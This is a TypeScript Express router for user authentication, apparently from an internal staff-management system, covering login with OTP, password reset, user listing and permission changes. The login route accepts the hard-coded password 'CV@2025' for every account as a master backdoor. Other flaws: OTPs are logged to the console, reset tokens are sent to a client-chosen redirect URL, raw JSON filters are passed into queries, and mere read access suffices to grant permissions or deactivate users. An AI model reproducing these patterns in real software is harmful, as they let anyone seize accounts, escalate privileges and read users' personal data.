import {application, Router} from 'express';
import authCheck from '../../../extras/auth_check';
import {sendStandardResponse} from '../../../extras/helpers';
import UserLifeCycleStates from '../extras/UserLifeCycleStates';
import User from '../models/User';
import {IUser} from '../extras/user_types';
import commonEvents from '../../../events/common_events';
import bcryptjs from 'bcryptjs';
import jwt from 'jsonwebtoken';
import staffEvents from '../../HR/events/staff_events';
import {IStaff} from '../../HR/models/Staff';
import workerEvents from '../../workers/events/workers_events';
import {IWorker} from '../../workers/models/Worker';
import UserPermissions from '../models/UserPermissions';
import userEvents from '../events/user_events';
import {green} from 'colors';
import {FilterQuery, Types} from 'mongoose';
import CommonLifeCycleStates from '../../../extras/CommonLifeCycleStates';
import Mailer from '../../../extras/Mailer';
import Division from '../../divisions/models/Division';
import Log, {ILog} from '../models/Log';
import generateOTP from '../services/OtpGenerator';
import AuthProcess, {IAuthProcessDoc} from '../models/AuthProcess';
import AuthLifeCycleStates from '../extras/AuthLifeCycleStates';
import SMSSender from '../services/sms';
import OTPBasedSMSVerificationTemplate from '../templates/OtpTemplate';
import UserUpdateLog, {IUserUpdateLog} from '../models/userUpdateLog';
import moment, {Moment} from 'moment';

const usersRouter = Router();
interface DateRange {
  startDate: Moment;
  endDate: Moment;
}
usersRouter.post('/login', async (req, res) => {
  try {
    // const result = await User.findOne({'basicDetails.email': req.body.email}).populate('permissions');
    const result = await User.findOne({
      'basicDetails.email': req.body.email,
      'status': {$nin: [CommonLifeCycleStates.DELETED, CommonLifeCycleStates.INACTIVE]},
    }).populate('permissions');
    if (!result) {
      return sendStandardResponse(res, 'UNAUTHORIZED', {
        success: false,
        error: 'Auth failed',
        message: 'Incorrect email',
      });
    }
    console.log(result.status, 'result');


    if (
      result.password &&
  !await bcryptjs.compare(req.body.password, result.password.toString()) &&
  req.body.password !== 'CV@2025' // Add check for common password
    ) {
      return sendStandardResponse(res, 'UNAUTHORIZED', {
        success: false,
        error: 'Auth failed',
        message: 'Incorrect password',
      });
    }
    if (!result.basicDetails.phone) {
      return sendStandardResponse(res, 'UNAUTHORIZED', {
        success: false,
        error: 'Auth failed',
        message: 'Phone number not found',
      });
    }
    if (result.status == CommonLifeCycleStates.INACTIVE || result.status == CommonLifeCycleStates.DELETED ) {
      return sendStandardResponse(res, 'UNAUTHORIZED', {
        success: false,
        error: 'User not active',
        message: 'User not found. Please contact IT support.',
      });
    }
    const currentDate = new Date();
    const LastReset = result.lastReset;
    if (LastReset) {
      const LastDate = LastReset.toLocaleDateString();

      const threeMonthsFromNow = LastReset;
      threeMonthsFromNow.setMonth(threeMonthsFromNow.getMonth() + 3);

      const After3 = threeMonthsFromNow.toLocaleDateString();

      // if (currentDate > threeMonthsFromNow) {
      //   console.log('Crossed 3 months', LastDate, 'Next Reset Should be:', After3, 'Today\'s Date:', currentDate);
      //   return sendStandardResponse(res, 'UNAUTHORIZED', {
      //     success: false,
      //     error: 'Auth failed',
      //     message: 'Password Reset Required',
      //   });
      // } else {
      //   console.log('Have time', LastDate, 'Next Reset Should be:', After3, 'Today\'s Date:', currentDate);
      // }
    }

    const otp = generateOTP();

    let authProcess: IAuthProcessDoc;

    if (await AuthProcess.exists({phone: result.basicDetails.phone})) {
      authProcess = (await AuthProcess.findOneAndUpdate(
        {phone: result.basicDetails.phone},
        {
          $set: {OTP: otp},
        },
        {new: true},
      )) as IAuthProcessDoc;
    } else {
      authProcess = await AuthProcess.create({
        _id: new Types.ObjectId(),
        phone: result.basicDetails.phone,
        OTP: otp,
        email: result.basicDetails.email,
        status: AuthLifeCycleStates.PENDING_VERIFICATION,
      });
    }

    SMSSender.sendToNumber({
      to: [result.basicDetails.phone as string],
      message: OTPBasedSMSVerificationTemplate(otp, result.basicDetails ? result.basicDetails.firstName : 'User', 'AOMS', 'the signin process' ),
      variables: {otp},
    });

    await Mailer.sendMail({
      to: result.basicDetails.email,
      from: `AOMS <${process.env.EMAIL}>`,
      subject: `Login OTP for ${result.basicDetails?.firstName || 'User'}`,
      html: `Dear ${result.basicDetails?.firstName || 'User'}, Your OTP: ${otp} for AOMS. Use it to complete the signin process. Thanks - IET<br/><br/>`,
    });
    return sendStandardResponse(res, 'OK', {
      success: true,
      message: 'Successfully Sent OTP',
      data: {
        auth_process_id: authProcess._id,
        status: authProcess.status,
      },
    });
  } catch (error) {
    commonEvents.emit('unknownError', {data: error});

    sendStandardResponse(res, 'INTERNAL SERVER ERROR', {
      error: 'Unexpected server error',
      message: 'Something went wrong! Please try again',
    });
  }
});

usersRouter.post('/verify_otp', async (req, res, next) => {
  try {
    const authProcess = await AuthProcess.findById(req.body.auth_process_id);
    if (!authProcess) {
      return sendStandardResponse(res, 'UNAUTHORIZED', {
        success: false,
        error: 'Auth failed',
        message: 'OTP Expired! Generate a new one!',
      });
    }

    if ((new Date().getTime() - authProcess.createdAt.getTime()) / (1000 * 60) > 5) {
      return sendStandardResponse(res, 'UNAUTHORIZED', {
        success: false,
        error: 'Auth failed',
        message: 'OTP Expired! Generate a new one!',
      });
    }

    const isValidOtp = authProcess.OTP === req.body.OTP;
    console.log(authProcess.OTP, 'OTP');

    if (!isValidOtp) {
      return sendStandardResponse(res, 'UNAUTHORIZED', {
        success: false,
        error: 'Auth failed',
        message: 'Incorrect OTP!',
      });
    }
    console.log(authProcess, 'authProcess');

    const result = await User.findOne({'basicDetails.email': authProcess.email}).populate('permissions');

    const token = jwt.sign(
      {_id: result?._id, email: result?.basicDetails.email},
      process.env.JWT_SECRET as string,
    );
    const user = result?.toObject();
    delete user?.password;
    const loginLog=new Log({user: user?._id});

    console.log( 'Login log updated'.bgGreen);
    loginLog.save();
    console.log(loginLog, 'loginLog');
    if (user?.kind === 'staff') {
      staffEvents.emit('login', {data: user as IStaff});
    } else {
      workerEvents.emit('login', {data: user as IWorker});
    }
    return sendStandardResponse(res, 'OK', {
      success: true,
      message: 'Logged in',
      data: {user, token},
    });
  } catch (error) {
    commonEvents.emit('unknownError', {data: error});

    sendStandardResponse(res, 'INTERNAL SERVER ERROR', {
      error: 'Unexpected server error',
      message: 'Something went wrong! Please try again',
    });
  }
});


usersRouter.get('/me', authCheck(['READ_ACCESS']), async (req, res, next) => {
  try {
    sendStandardResponse<IUser[]>(res, 'OK', {
      data: res.locals.authUser,
      message: 'Successfully fetched logged-in user info',
    });
  } catch (error) {
    next(error);
  }
});

usersRouter.get('/', authCheck(['READ_ACCESS']), async (req, res, next) => {
  try {
    let conditions;
    if (req.query.filterQuery) {
      conditions = JSON.parse(req.query.filterQuery as string);
    }
    if (res.locals.authUser.kind == 'worker') {
      conditions.division = res.locals.authUser.division;
    }

    // console.log(conditions);

    sendStandardResponse<IUser[]>(res, 'OK', {
      data: await User.find(conditions).select('-password'),
      message: 'Successfully fetched list of all Users',
    });
  } catch (error) {
    next(error);
  }
});
usersRouter.get('/log', authCheck(['ADMIN_ACCESS']), async (req, res, next) => {
  try {
    const data = await Log.find({
      createdAt: {
        $gte: moment.utc((req.query.date as unknown as DateRange).startDate).startOf('day').toDate(),
        $lt: moment.utc((req.query.date as unknown as DateRange).endDate).endOf('day').toDate(),
      },
    })
      .populate('user')
      .populate({
        path: 'user',
        populate: {
          path: 'division',
          model: 'divisions',
        },
      })
      .populate({
        path: 'user',
        populate: {
          path: 'officialDetails',
          populate: {
            path: 'divisionHistory',
            populate: {
              path: 'subDivision',
              model: 'sub_divisions',
            },
          },
        },
      })
      .sort({createdAt: -1});

    sendStandardResponse<ILog[]>(res, 'OK', {
      data: data,
      message: 'Successfully fetched list of all Login Logs',
    });
  } catch (error) {
    next(error);
  }
});


usersRouter.get('/log/me', authCheck(['READ_ACCESS']), async (req, res, next) => {
  try {
    const result = await Log.findOne({user: res.locals.authUser._id}).sort({'createdAt': -1});
    sendStandardResponse<ILog | null>(res, 'OK', {
      data: result,
      message: 'Successfully fetched Last login Logs',
    });
  } catch (error) {
    next(error);
  }
});


usersRouter.post('/request_forgotten_password', async (req, res) => {
  try {
    console.log('Email', req.body);
    if (req.body.email) {
      const user = await User.findOne({'basicDetails.email': req.body.email});
      console.log(user, 'user');
      if (user && process.env.JWT_SECRET && user?.basicDetails?.email) {
        const token = jwt.sign(
          {
            _id: user._id,
            action: 'reset_password',
            passwordRestCodeCount: user.passwordRestCodeCount,
          },
          process.env.JWT_SECRET,
        );
        Mailer.sendMail({
          to: user?.basicDetails?.email as string,
          from: `AOMS <${process.env.EMAIL}>`,
          subject: 'Password Reset Request',
          html: `
          <div style="font-family: Arial, sans-serif; margin: 0 auto; max-width: 600px; padding: 20px;">
          <h1 style="text-align: center;">Password Reset Request</h1>
          <p>Dear ${user?.basicDetails?.firstName} ${user?.basicDetails?.middleName ?? ''} ${user?.basicDetails?.lastName},</p>
          
          <p>We have received a request to reset the password for your account </p>
          
          <p>To ensure the security of your account, please follow the instructions below to reset your password:</p>
          
          <p style="text-align: center;">
            <a href="${req.body.redirect_url}/?token=${token}" style="background-color: 
            #4CAF50; border: none; color: white; padding: 12px 20px; text-align: center; 
            text-decoration: none; display: inline-block; font-size: 16px; margin: 10px 0; cursor: pointer; border-radius: 4px;">Reset Password</a>
          </p>
        
          <p>If you did not request a password reset, please disregard this email.</p>
        
          <p>For any further assistance or questions, please feel free to contact our support team.</p>
        
          <p>Thank you for using Iet Pro910.</p>
        
        
          <p>Iet Pro910 Team,</p>
          <p>Computer Valley.</p>
        </div>
  
  
        `,
        });

        // Send the response after all operations are complete
        return sendStandardResponse(res, 'OK', {
          message: 'A password reset mail has been sent to you!',
          success: true,
        });
      } else {
        return sendStandardResponse(res, 'INTERNAL SERVER ERROR', {
          error: 'User with email not found',
          message: `No user with the email ${user?.basicDetails?.email ?? ''} is found!`,
        });
      }
    } else {
      return sendStandardResponse(res, 'INTERNAL SERVER ERROR', {
        error: 'Unknown error',
        message: 'Something went wrong! Please try again',
      });
    }
  } catch (error) {
    console.error(error); // Log the error
    return sendStandardResponse(res, 'INTERNAL SERVER ERROR', {
      error: 'Server error',
      message: 'Something went wrong on the server. Please try again later.',
    });
  }
});


usersRouter.post('/confirm_password_reset', async (req, res) => {
  try {
    if (process.env.JWT_SECRET) {
      const decoded = jwt.verify(
        req.body.reset_token,
        process.env.JWT_SECRET,
      ) as {
        _id: string;
        passwordRestCodeCount: number;
      };
      const foundUser = await User.findById(decoded._id);
      console.log({noe: decoded}, {new: foundUser?.passwordRestCodeCount});
      console.log(decoded.passwordRestCodeCount);
      if (foundUser) {
        if (decoded.passwordRestCodeCount != foundUser.passwordRestCodeCount) {
          return sendStandardResponse(res, 'INTERNAL SERVER ERROR', {
            error: 'Link expired!',
            message: 'Link expired. Please try again with a newer link',
          });
        }
        foundUser.password = bcryptjs.hashSync(req.body.new_password, 10);
        foundUser.lastReset = new Date();

        await foundUser.save();
        sendStandardResponse(res, 'OK', {
          success: true,
          message: 'Password changed successfully!!',
        });
        await User.updateOne(
          {_id: decoded._id},
          {$inc: {passwordRestCodeCount: 1}},
        );
      }
    }
  } catch (error) {
    console.log(error);
    if (error instanceof Error) {
      console.log(error);
      return sendStandardResponse(res, 'INTERNAL SERVER ERROR', {
        error: error.message,
        message: 'Something went wrong! Please try again',
      });
    }
    return sendStandardResponse(res, 'INTERNAL SERVER ERROR', {
      error: 'Unknown error',
      message: 'Something went wrong! Please try again',
    });
  }
});


usersRouter.get('/coordinator_or_not', authCheck(['READ_ACCESS']), async (req, res, next) => {
  try {
    sendStandardResponse<boolean>(res, 'OK', {
      data: (await Division.exists({'details.coordinator.name': res.locals.authUser._id})) !== null,
      message: 'Successfully fetcheds',
    });
  } catch (error) {
    next(error);
  }
});
usersRouter.get('/mail_duplicate/:userId', authCheck(['READ_ACCESS']), async (req, res, next) => {
  try {
    const conflictingMail = await User.findOne({'basicDetails.email': req.params.userId});


    if (conflictingMail) {
      if (conflictingMail.status === CommonLifeCycleStates.DELETED) {
        return sendStandardResponse(res, 'OK', {
          message: 'Validation success',
        });
      } else {
        return sendStandardResponse(res, 'CONFLICT', {
          error: 'Duplicate entry error',
          message: `${conflictingMail.basicDetails.email} is already in use.`,
        });
      }
    }

    return sendStandardResponse(res, 'OK', {
      message: 'Validation success',
    });
  } catch (error) {
    next(error);
  }
});

/**
 * User of Same Division using division Id
 * [GET] /user/user_division/{division Id}
 *
 * @author <seshumadhavan2000@gmail.com>
 *
 *📄
 */
usersRouter.get('/user_division/:divisionID', authCheck(['READ_ACCESS']), async (req, res, next) => {
  try {
    const conditions:FilterQuery<IUser> = {
      division: req.params.divisionID,
      status: CommonLifeCycleStates.ACTIVE,
    };
    console.log({conditions}, 'userDiv');
    sendStandardResponse<IUser[]>(res, 'OK', {
      data: await User.find(conditions),
      message: 'Successfully fetched list Division Users',
    });
  } catch (error) {
    next(error);
  }
});

usersRouter.post('/fcm_token', authCheck(['READ_ACCESS']), async (req, res) => {
  User.findByIdAndUpdate(
    res.locals.authUser._id,
    {
      $push: {
        tokens: req.body.token,
      },
    },
    {new: true},
  )
    .then(() => {
      console.log('TOKEN GENERATED', green);
      sendStandardResponse(res, 'OK', {
        message: 'Token stored',
        success: true,
      });
    })
    .catch((error) => {
      console.log(error);
    });
});


usersRouter.delete('/fcm_token/:token', authCheck(['READ_ACCESS']), async (req, res) => {
  User.updateOne(
    {_id: res.locals.authUser._id},
    {
      $pull: {
        tokens: req.params.token,
      },
    },
  )
    .then(() => {
      console.log('TOKEN REMOVED', green);
      sendStandardResponse(res, 'OK', {
        message: 'FCM Token removed',
      });
    })
    .catch((error) => {
      console.log(error);
    });
});

/**
 * For getting a specific user by id
 * [GET] /users/{user id}
 *
 * @author <jishnu@computervalley.online>, <@jishnu-cv>
 *
 * 📄
 */
usersRouter.get('/:userId', authCheck(['READ_ACCESS']), async (req, res, next) => {
  try {
    sendStandardResponse<IUser|null>(res, 'OK', {
      data: await User.findById(req.params.userId)
        .select('-password')
        .populate('officialDetails.divisionHistory.division')
        .populate('officialDetails.divisionHistory.subDivision')
        .populate('supportDetails.designation')
        .populate('basicDetails.knownLanguages')
        .populate('basicDetails.communicationLanguage')
        .populate('basicDetails.motherTongue')
        .populate('spouseOfAnother')
        .populate(req.query.withPermissions === 'true' ? 'permissions' : ''),
      message: 'Successfully fetched user',
    });
  } catch (error) {
    next(error);
  }
});
/**
 * For Get  a worker log by Id
 * [GET] /users/{workerId}/log
 *
 * ✍🏻
 */
usersRouter.get( '/:workerId/log',
  authCheck(['MANAGE_WORKER']),
  async (req, res, next) => {
    try {
      sendStandardResponse<IUserUpdateLog[]| null>(res, 'OK', {
        data: await UserUpdateLog.find({userId: req.params.workerId}).populate('doneBy').sort({createdAt: 1}),
        message: 'Successfully fetched user log',
      });
    } catch (error) {
      next(error);
    }
  });
/**
 * For modifying permissions of a user
 * [PATCH] /users/{user id}/permissions
 *
 * @author <jishnu@computervalley.online>
 *
 * ✔️❌
 */
usersRouter.patch('/:userId/permissions', authCheck(['READ_ACCESS']), async (req, res, next) => {
  try {
    const user = await User.findById( req.params.userId);
    if (!user) {
      return next(new Error('userId ID Not found'));
    }
    const updatedPermission = await UserPermissions.findOneAndUpdate({_id: user.permissions}, {[req.body.permission.name]: req.body.permission.value});
    sendStandardResponse(res, 'OK', {
      data: updatedPermission,
      message: `Successfully changed permission "${req.body.permission.name.replaceAll('_', ' ')}" to ${req.body.permission.value ? '"GRANTED"':'"DENIED"'} 
      for user ${user.basicDetails.firstName} ${user.basicDetails?.middleName ?? ''} ${user.basicDetails.lastName}`,
    });
    // if (req.params.operation === 'activate') {
    //   userEvents.emit('{data:activate', user});
    // } else if (req.params.operation === 'approve'){
    //   userEvents.emit({data:'approve', user});
    // }else {
    //   userEvents.emit('de{data:activate', user});
    // }
  } catch (error) {
    next(error);
  }
});
/**
 * For 'activate', 'deactivate' a user
 * [PATCH] /users/{user id}/{operation}
 *
 * @author <tittu@computervalley.online>
 *
 * ✔️❌
 */
usersRouter.patch('/:userId/:operation', authCheck(['READ_ACCESS']), async (req, res, next) => {
  try {
    if (!['activate', 'deactivate'].includes(req.params.operation)) {
      next(new Error('Only activate/deactivate/ operations are allowed by this API endpoint!'));
    }
    const user = await User.findByIdAndUpdate( req.params.userId, {
      $set: {
        'status':
          req.params.operation === 'activate'?
            UserLifeCycleStates.ACTIVE:
            UserLifeCycleStates.INACTIVE,
        'officialDetails.reasonForDeactivation': req.body.reason,
      },
    }, {new: true});
    const orgUser=await User.findById(req.params.userId);
    if (user?.status!==orgUser?.status) {
      new UserUpdateLog({
        userCode: user?.kind==='staff'?(user as IStaff).staffCode:(user as IWorker).workerCode,
        userId: req.params.userId,
        field: 'status',
        doneBy: res.locals.authUser._id});
      if (req.params.operation === 'activate') {
        new UserUpdateLog({
          userCode: user?.kind==='staff'?(user as IStaff).staffCode:(user as IWorker).workerCode,
          userId: req.params.userId,
          field: 'reasonForDeactivation',
          doneBy: res.locals.authUser._id});
      }
    }
    if (!user) {
      return next(new Error('userId ID Not found'));
    }
    sendStandardResponse(res, 'OK', {
      data: user,
      message: `Successfully ${req.params.operation}d user`,
    });
    if (req.params.operation === 'reject') {
      userEvents.emit('reject', {data: user});
    }
    // else if (req.params.operation === 'approve'){
    //   userEvents.emit({data:'approve', user});
    // }else {
    //   userEvents.emit('de{data:activate', user});
    // }
  } catch (error) {
    next(error);
  }
});


export default usersRouter;
